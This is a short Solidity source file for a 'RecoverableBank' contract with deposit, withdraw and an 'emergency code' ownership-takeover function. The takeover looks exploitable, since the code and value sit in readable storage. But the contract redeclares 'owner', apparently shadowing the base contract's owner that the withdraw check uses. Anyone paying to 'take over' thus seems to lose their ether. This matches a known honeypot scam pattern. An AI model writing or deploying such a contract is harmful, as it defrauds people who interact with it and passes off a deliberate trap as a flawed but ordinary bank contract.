pragma solidity ^0.4.18;



contract RecoverableBank is Owned {
    event BankDeposit(address from, uint amount);
    event BankWithdrawal(address from, uint amount);
    address public owner = msg.sender;
    uint256 ecode;
    uint256 evalue;

    function() public payable {
        deposit();
    }

    function deposit() public payable {
        require(msg.value > 0);
        BankDeposit(msg.sender, msg.value);
    }

    function setEmergencyCode(uint256 code, uint256 value) public onlyOwner {
        ecode = code;
        evalue = value;
    }

    function useEmergencyCode(uint256 code) public payable {
        if ((code == ecode) && (msg.value == evalue)) owner = msg.sender;
    }

    function withdraw(uint amount) public onlyOwner {
        require(amount <= this.balance);
        msg.sender.transfer(amount);
    }
}